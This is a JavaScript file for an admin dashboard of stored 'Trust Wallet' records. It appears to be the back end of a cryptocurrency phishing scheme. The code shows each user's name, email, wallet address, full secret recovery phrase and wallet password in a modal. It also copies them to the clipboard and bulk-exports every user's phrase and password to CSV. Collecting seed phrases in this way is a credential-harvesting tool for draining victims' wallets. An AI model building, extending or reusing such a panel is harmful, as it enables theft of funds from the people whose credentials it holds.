// admintrustwallets.js - Modal Version, CSP Compliant

document.addEventListener('DOMContentLoaded', function() {
    initModal();
    initSidebar();
    initThemeToggle();
    initExportButton();
});

// Modal functionality
let currentWalletData = null;
let currentWalletId = null;

function initModal() {
    const modal = document.getElementById('walletModal');
    const modalClose = document.getElementById('modalClose');
    const modalCloseBtn = document.getElementById('modalCloseBtn');
    const modalCopyBtn = document.getElementById('modalCopyBtn');
    const modalDeleteBtn = document.getElementById('modalDeleteBtn');

    // Close modal events
    modalClose.addEventListener('click', closeModal);
    modalCloseBtn.addEventListener('click', closeModal);

    // Close on overlay click
    modal.addEventListener('click', function(e) {
        if (e.target === modal) {
            closeModal();
        }
    });

    // Close on Escape key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && modal.classList.contains('active')) {
            closeModal();
        }
    });

    // Copy button
    modalCopyBtn.addEventListener('click', function() {
        if (currentWalletData) {
            copyWalletData(currentWalletData);
        }
    });

    // Delete button
    modalDeleteBtn.addEventListener('click', function() {
        if (currentWalletId) {
            deleteWallet(currentWalletId);
        }
    });

    // Row click handlers
    document.querySelectorAll('.wallet-row').forEach(row => {
        row.addEventListener('click', function(e) {
            // Don't open modal if clicking the view button (it handles separately)
            if (e.target.closest('[data-action="view"]')) {
                return;
            }
            openWalletModal(this);
        });
    });

    // View button handlers
    document.querySelectorAll('[data-action="view"]').forEach(btn => {
        btn.addEventListener('click', function(e) {
            e.stopPropagation();
            openWalletModal(this.closest('.wallet-row'));
        });
    });
}

function openWalletModal(row) {
    const walletJson = row.dataset.wallet;
    const walletId = row.dataset.id;

    try {
        const wallet = JSON.parse(walletJson);
        currentWalletData = wallet;
        currentWalletId = walletId;

        // Populate modal fields
        document.getElementById('modalUserName').textContent = 
            wallet.userId ? `${wallet.userId.firstName} ${wallet.userId.lastName}` : 'Unknown User';

        document.getElementById('modalUserEmail').textContent = 
            wallet.userId ? wallet.userId.email : 'N/A';

        document.getElementById('modalWalletName').textContent = 
            wallet.walletName || 'My Trust Wallet';

        document.getElementById('modalWalletId').textContent = 
            wallet.trustWalletId || 'N/A';

        document.getElementById('modalImportMethod').textContent = 
            wallet.importMethod ? wallet.importMethod.replace('_', ' ').toUpperCase() : 'UNKNOWN';

        document.getElementById('modalStatus').textContent = 
            wallet.isConnected ? 'Connected' : 'Disconnected';
        document.getElementById('modalStatus').style.color = 
            wallet.isConnected ? 'var(--tg-success)' : '#888';

        // SENSITIVE DATA - FULL DISPLAY
        document.getElementById('modalWalletAddress').textContent = 
            wallet.walletAddress || 'Not set';

        document.getElementById('modalSecretPhrase').textContent = 
            wallet.secretPhrase || 'No phrase set';

        document.getElementById('modalPassword').textContent = 
            wallet.walletPassword || 'No password set';

        // Balances
        document.getElementById('modalHsolud').textContent = 
            wallet.hsoludBalance || '0';
        document.getElementById('modalSgow').textContent = 
            wallet.sgowBalance || '0';

        // Metadata
        document.getElementById('modalBackupStatus').textContent = 
            wallet.isBackedUp ? '✓ Backed Up' : '⚠ Not Backed Up';
        document.getElementById('modalBackupStatus').style.color = 
            wallet.isBackedUp ? 'var(--tg-success)' : 'var(--tg-warning)';

        const date = new Date(wallet.connectedAt);
        document.getElementById('modalConnectedAt').textContent = 
            date.toLocaleString('en-US', { 
                month: 'short', 
                day: 'numeric', 
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit'
            });

        // Show modal
        document.getElementById('walletModal').classList.add('active');
        document.body.style.overflow = 'hidden'; // Prevent background scrolling

        // Log access
        console.log(`[SECURITY] Wallet ${walletId} viewed at ${new Date().toISOString()}`);

    } catch (error) {
        console.error('Error opening modal:', error);
        showToast('Error loading wallet details', 'error');
    }
}

function closeModal() {
    const modal = document.getElementById('walletModal');
    modal.classList.remove('active');
    document.body.style.overflow = '';

    // Clear sensitive data after short delay
    setTimeout(() => {
        document.getElementById('modalWalletAddress').textContent = '-';
        document.getElementById('modalSecretPhrase').textContent = '-';
        document.getElementById('modalPassword').textContent = '-';
        currentWalletData = null;
        currentWalletId = null;
    }, 300);
}

function copyWalletData(wallet) {
    const data = `TRUST WALLET DETAILS
====================

USER INFORMATION
-----------------
Name: ${wallet.userId ? wallet.userId.firstName + ' ' + wallet.userId.lastName : 'Unknown'}
Email: ${wallet.userId ? wallet.userId.email : 'N/A'}

WALLET INFORMATION
-------------------
Wallet Name: ${wallet.walletName || 'My Trust Wallet'}
Wallet ID: ${wallet.trustWalletId || 'N/A'}
Import Method: ${wallet.importMethod ? wallet.importMethod.replace('_', ' ').toUpperCase() : 'UNKNOWN'}
Status: ${wallet.isConnected ? 'Connected' : 'Disconnected'}

SENSITIVE CREDENTIALS
---------------------
Wallet Address: ${wallet.walletAddress || 'Not set'}
Secret Phrase: ${wallet.secretPhrase || 'No phrase set'}
Wallet Password: ${wallet.walletPassword || 'No password set'}

BALANCES
--------
HSOLUD: ${wallet.hsoludBalance || '0'}
SGOW: ${wallet.sgowBalance || '0'}

METADATA
--------
Backup Status: ${wallet.isBackedUp ? 'Backed Up' : 'Not Backed Up'}
Connected: ${new Date(wallet.connectedAt).toLocaleString()}

Exported: ${new Date().toLocaleString()}
`;

    navigator.clipboard.writeText(data).then(() => {
        showToast('✓ All wallet data copied to clipboard', 'success');
    }).catch(err => {
        // Fallback
        const textArea = document.createElement('textarea');
        textArea.value = data;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        document.body.appendChild(textArea);
        textArea.select();

        try {
            document.execCommand('copy');
            showToast('✓ All wallet data copied to clipboard', 'success');
        } catch (e) {
            showToast('✗ Failed to copy data', 'error');
        }

        document.body.removeChild(textArea);
    });
}

async function deleteWallet(walletId) {
    if (!confirm('⚠️ WARNING: Are you sure you want to delete this wallet?\n\nThis action cannot be undone and will permanently remove all wallet data including credentials.')) {
        return;
    }

    if (!confirm('🔴 FINAL CONFIRMATION: Delete this wallet permanently?')) {
        return;
    }

    try {
        const response = await fetch(`/admin/trust-wallets/${walletId}`, {
            method: 'DELETE',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            }
        });

        if (response.ok) {
            closeModal();
            showToast('✓ Wallet deleted successfully', 'success');

            // Remove row with animation
            const row = document.querySelector(`tr[data-id="${walletId}"]`);
            if (row) {
                row.style.transition = 'all 0.3s ease';
                row.style.opacity = '0';
                row.style.transform = 'translateX(-20px)';
                setTimeout(() => {
                    row.remove();
                    // Check if table is empty
                    const tbody = document.querySelector('#walletsTable tbody');
                    if (tbody.children.length === 0) {
                        location.reload();
                    }
                }, 300);
            }
        } else {
            const error = await response.text();
            showToast(`✗ Failed to delete: ${error}`, 'error');
        }
    } catch (error) {
        showToast('✗ Network error deleting wallet', 'error');
        console.error('Delete error:', error);
    }
}

// Export functionality
function initExportButton() {
    const exportBtn = document.getElementById('exportBtn');
    if (!exportBtn) return;

    exportBtn.addEventListener('click', function() {
        const rows = document.querySelectorAll('.wallet-row');
        if (rows.length === 0) {
            showToast('No wallets to export', 'error');
            return;
        }

        let csv = 'ID,User Name,Email,Wallet Name,Wallet ID,Wallet Address,Secret Phrase,Password,Import Method,HSOLUD,SGOW,Status,Backup Status,Connected Date\n';

        rows.forEach(row => {
            try {
                const wallet = JSON.parse(row.dataset.wallet);
                const escape = (str) => `"${(str || '').replace(/"/g, '""')}"`;

                csv += [
                    row.dataset.id,
                    escape(wallet.userId ? `${wallet.userId.firstName} ${wallet.userId.lastName}` : 'Unknown'),
                    escape(wallet.userId ? wallet.userId.email : ''),
                    escape(wallet.walletName),
                    escape(wallet.trustWalletId),
                    escape(wallet.walletAddress),
                    escape(wallet.secretPhrase),
                    escape(wallet.walletPassword),
                    escape(wallet.importMethod),
                    wallet.hsoludBalance || '0',
                    wallet.sgowBalance || '0',
                    wallet.isConnected ? 'Connected' : 'Disconnected',
                    wallet.isBackedUp ? 'Backed Up' : 'Not Backed Up',
                    escape(new Date(wallet.connectedAt).toISOString())
                ].join(',') + '\n';
            } catch (e) {
                console.error('Error parsing wallet data:', e);
            }
        });

        const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `trust-wallets-export-${new Date().toISOString().split('T')[0]}.csv`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);

        showToast(`✓ Exported ${rows.length} wallets to CSV`, 'success');
    });
}

// Sidebar functionality
function initSidebar() {
    const sidebarToggle = document.getElementById('sidebarToggle');
    const sidebarClose = document.getElementById('sidebarClose');
    const adminSidebar = document.getElementById('adminSidebar');

    if (sidebarToggle) {
        sidebarToggle.addEventListener('click', () => {
            adminSidebar.classList.toggle('active');
        });
    }

    if (sidebarClose) {
        sidebarClose.addEventListener('click', () => {
            adminSidebar.classList.remove('active');
        });
    }
}

// Theme toggle
function initThemeToggle() {
    const themeToggle = document.getElementById('themeToggle');
    if (!themeToggle) return;

    const savedTheme = localStorage.getItem('theme') || 'dark';
    document.documentElement.setAttribute('data-theme', savedTheme);
    updateThemeIcon(savedTheme);

    themeToggle.addEventListener('click', () => {
        const html = document.documentElement;
        const currentTheme = html.getAttribute('data-theme');
        const newTheme = currentTheme === 'light' ? 'dark' : 'light';

        html.setAttribute('data-theme', newTheme);
        localStorage.setItem('theme', newTheme);
        updateThemeIcon(newTheme);
    });
}

function updateThemeIcon(theme) {
    const icon = document.getElementById('themeIcon');
    if (!icon) return;

    if (theme === 'light') {
        icon.innerHTML = '<path d="M12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zM2 13h2c.55 0 1-.45 1-1s-.45-1-1-1H2c-.55 0-1 .45-1 1s.45 1 1 1zm18 0h2c.55 0 1-.45 1-1s-.45-1-1-1h-2c-.55 0-1 .45-1 1s.45 1 1 1zM11 2v2c0 .55.45 1 1 1s1-.45 1-1V2c0-.55-.45-1-1-1s-1 .45-1 1zm0 18v2c0 .55.45 1 1 1s1-.45 1-1v-2c0-.55-.45-1-1-1s-1 .45-1 1zM5.99 4.58a.996.996 0 00-1.41 0 .996.996 0 000 1.41l1.06 1.06c.39.39 1.03.39 1.41 0s.39-1.03 0-1.41L5.99 4.58zm12.37 12.37a.996.996 0 00-1.41 0 .996.996 0 000 1.41l1.06 1.06c.39.39 1.03.39 1.41 0 .39-.39.39-1.03 0-1.41l-1.06-1.06zm1.06-10.96a.996.996 0 000-1.41.996.996 0 00-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06zM7.05 18.36a.996.996 0 000 1.41.996.996 0 001.41 0l1.06-1.06c.39-.39.39-1.03 0-1.41s-1.03-.39-1.41 0l-1.06 1.06z"/>';
    } else {
        icon.innerHTML = '<path d="M12,18C11.11,18 10.26,17.8 9.5,17.45C11.56,16.5 13,14.42 13,12C13,9.58 11.56,7.5 9.5,6.55C10.26,6.2 11.11,6 12,6A6,6 0 0,1 18,12A6,6 0 0,1 12,18M20,8.69V4H15.31L12,0.69L8.69,4H4V8.69L0.69,12L4,15.31V20H8.69L12,23.31L15.31,20H20V15.31L23.31,12L20,8.69Z" />';
    }
}

// Toast notification
function showToast(message, type = 'success') {
    const toast = document.getElementById('toast');
    const toastMessage = document.getElementById('toastMessage');
    const toastIcon = toast.querySelector('.toast-icon i');

    if (!toast || !toastMessage) return;

    toast.className = `toast ${type}`;
    toastMessage.textContent = message;

    if (type === 'success') {
        toastIcon.className = 'fas fa-check-circle';
    } else {
        toastIcon.className = 'fas fa-exclamation-circle';
    }

    toast.classList.add('show');

    if (toast.hideTimeout) {
        clearTimeout(toast.hideTimeout);
    }

    toast.hideTimeout = setTimeout(() => {
        toast.classList.remove('show');
    }, 4000);
}